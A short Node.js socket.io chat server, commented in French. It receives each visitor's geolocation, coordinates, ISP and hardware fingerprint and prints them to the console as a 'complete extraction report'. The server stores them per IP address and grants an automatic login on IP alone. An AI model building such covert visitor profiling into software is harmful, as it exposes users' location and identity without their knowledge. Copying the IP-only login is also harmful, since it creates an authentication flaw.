const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const database = {};

io.on('connection', (socket) => {
    // Extraction de l'IP via les headers ou la connexion directe
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('check_device', (info) => {
        database[ip] = { ...info, lastSeen: new Date().toLocaleString() };
        
        console.log(`
        ╔══════════════════════════════════════════════════╗
        ║          RAPPORT D'EXTRACTION COMPLET            ║
        ╠══════════════════════════════════════════════════╣
        ║ USER      : ${info.name}
        ║ IP        : ${ip}
        ║ VILLE     : ${info.geo.city} (${info.geo.region})
        ║ PAYS      : ${info.geo.country_name} (${info.geo.country_code})
        ║ COORD     : LAT ${info.geo.latitude} / LONG ${info.geo.longitude}
        ║ ISP       : ${info.geo.org} (ASN: ${info.geo.asn})
        ║ MATÉRIEL  : ${info.hardware.cores} Cores | ${info.hardware.ram}GB RAM
        ║ GPU       : ${info.hardware.gpu}
        ║ OS/NAV    : ${info.hardware.ua}
        ║ LANGUE    : ${info.hardware.lang}
        ║ TIMEZONE  : ${info.geo.timezone}
        ╚══════════════════════════════════════════════════╝
        `);
        
        socket.emit('auto_login', database[ip]);
    });

    socket.on('chat message', (data) => {
        io.emit('chat message', data);
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`GALAXY_SYSTEM_ACTIVE_ON_${PORT}`);
});
